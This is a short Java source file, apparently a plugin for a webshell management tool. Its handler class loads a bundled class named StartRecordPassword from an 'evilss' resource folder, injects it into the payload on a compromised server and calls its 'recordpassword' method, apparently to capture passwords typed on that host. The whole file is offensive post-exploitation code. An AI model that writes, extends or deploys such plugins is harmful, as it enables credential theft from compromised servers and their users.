package shells.plugins.java.handler;

import util.functions;
import util.http.ReqParameter;

public class RecordPasswordHadnler extends HandlerBase{
    public String handler() {
        this.payload.include("StartRecordPassword", functions.readInputStreamAutoClose(this.getClass().getResourceAsStream("/evilss/StartRecordPassword.classs")));
        ReqParameter reqParameter = ReqParameter.createInvokeMethodReqParameter();
        reqParameter.add("aaa", "aaa");
        return encoding.Decoding(payload.evalFunc("StartRecordPassword", "recordpassword", reqParameter));
    }
}
